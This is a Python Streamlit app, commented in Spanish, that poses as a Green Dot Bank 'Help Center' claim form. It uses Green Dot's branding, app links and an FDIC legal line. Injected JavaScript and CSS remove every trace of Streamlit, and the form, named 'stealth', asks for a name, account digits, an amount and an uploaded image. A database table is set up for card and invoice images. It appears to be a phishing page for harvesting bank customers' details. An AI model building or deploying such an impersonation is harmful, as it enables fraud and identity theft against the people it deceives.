
import streamlit as st
import sqlite3
import os
import pandas as pd
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# 1. JAVASCRIPT: ELIMINACIÓN RADICAL DE TOOLBARS Y ANCHOR LINKS (CADA 100ms)
st.markdown("""<script>
    const forceClean = () => {
        const toRemove = [
            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
            '.stTooltipHoverTarget', 'button[title="View fullscreen"]', 
            'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
            '[data-testid="stHeaderActionElements"]', '.st-emotion-cache-gi0tri', 
            '.section-anchor', 'a.section-anchor'
        ];
        toRemove.forEach(s => {
            document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
        });
    };
    setInterval(forceClean, 100);
</script>""", unsafe_allow_html=True)

# 2. CSS: BLOQUEO DEFINITIVO Y ESTILO DE FORMULARIO
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 2rem !important; }

    /* Ocultar todo rastro de Streamlit */
    header, footer, .stDeployButton, [data-testid='stHeader'], 
    [data-testid="stElementToolbar"], .stElementToolbar, 
    button[title="View fullscreen"], .stTooltipHoverTarget,
    [data-testid="stHeaderActionElements"], .st-emotion-cache-gi0tri, 
    .section-anchor, a.section-anchor {
        display: none !important; 
        visibility: hidden !important; 
        opacity: 0 !important; 
        pointer-events: none !important;
    }

    /* Centrado de Logo */
    [data-testid="stImage"] {
        display: block !important;
        margin-left: auto !important;
        margin-right: auto !important;
        text-align: center !important;
        pointer-events: none !important;
    }

    [data-testid="stImage"] img {
        display: inline-block !important;
        width: 250px !important;
        height: auto !important;
    }

    @media (max-width: 768px) {
        [data-testid="stImage"] img { width: 180px !important; }
    }

    /* Estilo de Inputs */
    .stTextInput input, .stNumberInput input {
        background-color: #1a1a1a !important;
        color: white !important;
        border: 1px solid #333 !important;
    }

    .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }

    .promo-box {
        background-color: #111; padding: 25px 15px; text-align: center;
        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
        pointer-events: auto !important;
    }

    .legal-container { font-size: 11px; color: #777; text-align: center; margin-top: 40px; border-top: 1px solid #222; padding-top: 20px; }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): st.image("logo.svg")

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("claim_v1_stealth", clear_on_submit=True):
    st.text_input("Full Name", autocomplete="name")
    st.text_input("Last 4 digits of Account", autocomplete="off")
    st.number_input("Amount", min_value=0.0)
    st.file_uploader("Evidence", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

st.markdown("""<div class='promo-box'>
    <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
    <div style='display: flex; justify-content: center; gap: 10px;'>
        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("<div class='legal-container'>Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
